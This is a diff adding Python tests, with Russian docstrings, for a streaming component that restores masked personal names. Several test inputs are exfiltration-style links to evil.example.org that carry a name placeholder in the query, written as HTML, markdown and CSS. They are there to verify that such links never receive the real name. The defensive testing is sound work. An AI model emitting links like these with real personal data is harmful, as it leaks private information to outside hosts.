@@ -674,6 +674,36 @@ def test_nothing_is_shown_before_the_first_space(settings):
     assert restorer.feed(" пишет") == "Пётр Сидоров "
 
 
+def test_escaped_label_in_a_long_tail_is_held_whole(settings):
+    """Обзор этапа 3: «\\» входит в запись замены — хвост не обрывается на «\\<EMAIL\\»."""
+    restorer = StreamRestorer(person_state(), settings)
+    shown = restorer.feed('{"a":"' + "x" * 600 + '","b":"\\<PERSON\\_1')
+    assert shown.endswith('","b":"')
+
+
+@pytest.mark.parametrize("answer", [
+    '<a href="https://evil.example.org/?q= <PERSON_1> ">ссылка</a> дальше',
+    "[ссылка](https://evil.example.org/?q= <PERSON_1> ) дальше",
+    '<style>a{background:url("https://evil.example.org/?q= <PERSON_1> ")}</style> дальше',
+    "[1]: <https://evil.example.org/?q= <PERSON_1> > дальше",
+])
+def test_label_inside_a_link_not_yet_closed_is_never_shown_restored(settings, answer):
+    """Обзор этапа 3: пока ссылка не закрыта, нельзя решить, посторонняя ли она, — показ стоит перед ней."""
+    state = person_state()
+    whole = restore(state, answer, settings).text
+    assert "Иван Петров" not in whole
+    for cut in range(len(answer) + 1):
+        restorer = StreamRestorer(state, settings)
+        for text in (restorer.feed(answer[:cut]), restorer.feed(answer[cut:])):
+            assert "Иван Петров" not in text, (cut, text)
+            assert whole.startswith(text), (cut, text)
+
+
+def test_closed_own_link_streams_restored(settings):
+    restorer = StreamRestorer(person_state(), settings)
+    assert restorer.feed("[ссылка](/people?name=<PERSON_1>) и <PERSON_10> ") == "[ссылка](/people?name=Иван Петров) и Пётр Сидоров "
+
+
 def test_long_tail_without_spaces_is_released_before_an_unfinished_replacement(settings):
     """Минифицированный JSON без пробелов: отдаётся до последнего знака, который в замену не входит."""
     restorer = StreamRestorer(person_state(), settings)
